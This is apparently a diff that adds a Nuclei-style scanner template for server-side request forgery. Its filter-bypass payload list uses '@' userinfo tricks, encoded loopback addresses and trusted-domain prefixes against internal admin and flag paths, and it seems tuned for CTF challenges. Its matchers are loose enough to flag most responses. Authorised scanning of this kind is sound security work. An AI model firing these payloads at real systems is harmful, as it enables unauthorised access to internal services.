@@ -1,0 +1,262 @@
+id: ssrf-bypass
+
+info:
+  name: SSRF with HTTP Basic Auth and Endpoint Filter Bypass
+  author: custom
+  severity: high
+  description: Detects SSRF vulnerability using HTTP Basic Auth bypass and endpoint filter bypass techniques
+  tags: ssrf,bypass,auth,custom
+  reference:
+    - https://portswigger.net/web-security/ssrf
+    - https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html
+
+variables:
+  target_host: "127.0.0.1"
+  target_port: "8000"
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}"
+
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+
+    body: "{{param}}={{payload}}"
+
+    payloads:
+      param:
+        - "url"
+        - "uri"
+        - "target"
+        - "endpoint"
+        - "link"
+        - "src"
+        - "dest"
+        - "path"
+        - "redirect"
+        - "proxy"
+        - "fetch"
+        - "request"
+        - "load"
+        - "file"
+        - "page"
+
+      payload:
+        # HTTP Basic Auth bypass - query parameter (?)
+        - "http://{{Hostname}}@127.0.0.1:8000/admin?"
+        - "http://{{Hostname}}@127.0.0.1:8000/internal?"
+        - "http://{{Hostname}}@127.0.0.1:8000/flag?"
+        - "http://{{Hostname}}@127.0.0.1:8000/api/admin?"
+        - "http://{{Hostname}}@127.0.0.1:8000/api/internal?"
+        - "http://{{Hostname}}@127.0.0.1:8000/api/v1/admin?"
+        - "http://{{Hostname}}@127.0.0.1:8000/api/v1/internal?"
+        - "http://{{Hostname}}@127.0.0.1:8000/api/v1/test/internal?"
+        - "http://{{Hostname}}@127.0.0.1:8000/v1/admin?"
+        - "http://{{Hostname}}@127.0.0.1:8000/v1/internal?"
+        - "http://{{Hostname}}@127.0.0.1:8000/test/internal?"
+        - "http://{{Hostname}}@127.0.0.1:8000/debug?"
+        - "http://{{Hostname}}@127.0.0.1:8000/status?"
+        - "http://{{Hostname}}@127.0.0.1:8000/config?"
+        - "http://{{Hostname}}@127.0.0.1:8000/metrics?"
+
+        # HTTP Basic Auth bypass - fragment (#)
+        - "http://{{Hostname}}@127.0.0.1:8000/admin#"
+        - "http://{{Hostname}}@127.0.0.1:8000/internal#"
+        - "http://{{Hostname}}@127.0.0.1:8000/flag#"
+        - "http://{{Hostname}}@127.0.0.1:8000/api/admin#"
+        - "http://{{Hostname}}@127.0.0.1:8000/api/internal#"
+        - "http://{{Hostname}}@127.0.0.1:8000/api/v1/internal#"
+
+        # localhost variations
+        - "http://{{Hostname}}@localhost:8000/admin?"
+        - "http://{{Hostname}}@localhost:8000/internal?"
+        - "http://{{Hostname}}@localhost:8000/flag?"
+        - "http://{{Hostname}}@localhost:8000/api/internal?"
+        - "http://{{Hostname}}@0.0.0.0:8000/admin?"
+        - "http://{{Hostname}}@0.0.0.0:8000/internal?"
+        - "http://{{Hostname}}@[::1]:8000/admin?"
+        - "http://{{Hostname}}@[::1]:8000/internal?"
+
+        # 127.0.0.x variations
+        - "http://{{Hostname}}@127.0.0.1:8000/internal?"
+        - "http://{{Hostname}}@127.0.0.2:8000/internal?"
+        - "http://{{Hostname}}@127.1.1.1:8000/internal?"
+        - "http://{{Hostname}}@127.127.127.127:8000/internal?"
+
+        # Encoded IP variations
+        - "http://{{Hostname}}@2130706433:8000/admin?"
+        - "http://{{Hostname}}@2130706433:8000/internal?"
+        - "http://{{Hostname}}@0x7f.0.0.1:8000/admin?"
+        - "http://{{Hostname}}@0x7f.0.0.1:8000/internal?"
+        - "http://{{Hostname}}@0177.0.0.1:8000/admin?"
+        - "http://{{Hostname}}@0177.0.0.1:8000/internal?"
+        - "http://{{Hostname}}@127.1:8000/admin?"
+        - "http://{{Hostname}}@127.1:8000/internal?"
+
+        # URL encoded bypass suffix
+        - "http://{{Hostname}}@127.0.0.1:8000/admin%3f"
+        - "http://{{Hostname}}@127.0.0.1:8000/internal%3f"
+        - "http://{{Hostname}}@127.0.0.1:8000/api/internal%3f"
+        - "http://{{Hostname}}@127.0.0.1:8000/admin%23"
+        - "http://{{Hostname}}@127.0.0.1:8000/internal%23"
+
+        # Different common ports - 8080
+        - "http://{{Hostname}}@127.0.0.1:8080/admin?"
+        - "http://{{Hostname}}@127.0.0.1:8080/internal?"
+        - "http://{{Hostname}}@127.0.0.1:8080/api/admin?"
+        - "http://{{Hostname}}@localhost:8080/admin?"
+        - "http://{{Hostname}}@localhost:8080/internal?"
+
+        # Different common ports - 80
+        - "http://{{Hostname}}@127.0.0.1:80/admin?"
+        - "http://{{Hostname}}@127.0.0.1:80/internal?"
+        - "http://{{Hostname}}@localhost:80/admin?"
+        - "http://{{Hostname}}@localhost:80/internal?"
+
+        # Different common ports - 3000, 5000, 9000
+        - "http://{{Hostname}}@127.0.0.1:3000/admin?"
+        - "http://{{Hostname}}@127.0.0.1:3000/internal?"
+        - "http://{{Hostname}}@127.0.0.1:5000/admin?"
+        - "http://{{Hostname}}@127.0.0.1:5000/internal?"
+        - "http://{{Hostname}}@127.0.0.1:9000/admin?"
+        - "http://{{Hostname}}@127.0.0.1:9000/internal?"
+
+        # Direct localhost access (no bypass)
+        - "http://127.0.0.1:8000/admin"
+        - "http://127.0.0.1:8000/internal"
+        - "http://127.0.0.1:8000/flag"
+        - "http://127.0.0.1:8000/api/admin"
+        - "http://127.0.0.1:8000/api/internal"
+        - "http://localhost:8000/admin"
+        - "http://localhost:8000/internal"
+        - "http://localhost:8000/flag"
+
+        # Common trusted domains bypass
+        - "http://localhost@127.0.0.1:8000/admin?"
+        - "http://localhost@127.0.0.1:8000/internal?"
+        - "http://admin@127.0.0.1:8000/admin?"
+        - "http://admin@127.0.0.1:8000/internal?"
+        - "http://api@127.0.0.1:8000/internal?"
+
+        # Well-known domains bypass
+        - "http://google.com@127.0.0.1:8000/admin?"
+        - "http://google.com@127.0.0.1:8000/internal?"
+        - "http://google.com@127.0.0.1:8000/api/v1/test/internal?"
+        - "http://example.com@127.0.0.1:8000/admin?"
+        - "http://example.com@127.0.0.1:8000/internal?"
+        - "http://example.com@127.0.0.1:8000/api/v1/test/internal?"
+        - "http://github.com@127.0.0.1:8000/admin?"
+        - "http://github.com@127.0.0.1:8000/internal?"
+        - "http://stackoverflow.com@127.0.0.1:8000/internal?"
+        - "http://microsoft.com@127.0.0.1:8000/internal?"
+
+        # CTF/Security platform domains
+        - "http://dreamhack.io@127.0.0.1:8000/admin?"
+        - "http://dreamhack.io@127.0.0.1:8000/internal?"
+        - "http://dreamhack.io@127.0.0.1:8000/flag?"
+        - "http://dreamhack.io@127.0.0.1:8000/api/admin?"
+        - "http://dreamhack.io@127.0.0.1:8000/api/internal?"
+        - "http://dreamhack.io@127.0.0.1:8000/api/v1/internal?"
+        - "http://dreamhack.io@127.0.0.1:8000/api/v1/test/internal?"
+        - "http://tools.dreamhack.io@127.0.0.1:8000/admin?"
+        - "http://tools.dreamhack.io@127.0.0.1:8000/internal?"
+        - "http://tools.dreamhack.io@127.0.0.1:8000/api/v1/test/internal?"
+        - "http://hackthebox.eu@127.0.0.1:8000/internal?"
+        - "http://tryhackme.com@127.0.0.1:8000/internal?"
+
+        # Different ports with well-known domains
+        - "http://google.com@127.0.0.1:8080/internal?"
+        - "http://example.com@127.0.0.1:8080/internal?"
+        - "http://dreamhack.io@127.0.0.1:8080/internal?"
+
+        # Query parameter variations
+        - "http://{{Hostname}}@127.0.0.1:8000/admin?x=1"
+        - "http://{{Hostname}}@127.0.0.1:8000/internal?x=1"
+        - "http://{{Hostname}}@127.0.0.1:8000/flag?test=1"
+
+        # Fragment variations
+        - "http://{{Hostname}}@127.0.0.1:8000/admin#x"
+        - "http://{{Hostname}}@127.0.0.1:8000/internal#x"
+        - "http://{{Hostname}}@127.0.0.1:8000/flag#test"
+
+    attack: clusterbomb
+    stop-at-first-match: true
+
+    matchers-condition: or
+    matchers:
+      # Internal service access indicators
+      - type: word
+        name: ssrf-internal-service-keywords
+        words:
+          - "admin"
+          - "unauthorized"
+          - "forbidden"
+          - "private"
+          - "internal"
+          - "authentication required"
+          - "access denied"
+          - "login required"
+          - "dashboard"
+          - "panel"
+        part: body
+        condition: or
+        case-insensitive: true
+
+      # Authentication/Authorization responses (indicates internal service reached)
+      - type: dsl
+        name: ssrf-auth-required
+        dsl:
+          - 'status_code == 401'
+          - 'status_code == 403'
+        condition: or
+
+      # Successful internal access with meaningful response
+      - type: dsl
+        name: ssrf-successful-response
+        dsl:
+          - 'status_code == 200'
+          - 'len(body) > 100'
+          - '!contains(body, "Not Allowed")'
+          - '!contains(body, "Connection refused")'
+          - '!contains(body, "timeout")'
+          - '!contains(body, "timed out")'
+        condition: and
+
+      # Common internal service responses
+      - type: regex
+        name: ssrf-json-response
+        part: body
+        regex:
+          - '[\{,]\s*"(success|error|status|message|data)"\s*:\s*'
+          - '<title>[^<]*[Aa]dmin[^<]*</title>'
+          - '<title>[^<]*[Dd]ashboard[^<]*</title>'
+        condition: or
+
+      # Response differs from blocked/error responses
+      - type: dsl
+        name: ssrf-response-anomaly
+        dsl:
+          - 'status_code != 400'
+          - 'status_code != 500'
+          - 'len(body) > 50'
+        condition: and
+
+    extractors:
+      - type: regex
+        name: internal-endpoints
+        part: body
+        regex:
+          - '(https?://(?:localhost|127\.0\.0\.1|0\.0\.0\.0|\[::\d+\]):[0-9]+[^\s"''<>]*)'
+          - '(/api/[^\s"''<>]+)'
+          - '(/admin[^\s"''<>]*)'
+        internal: true
+
+      - type: kval
+        name: response-preview
+        part: body
+        kval:
+          - error
+          - message
+          - status
+          - data
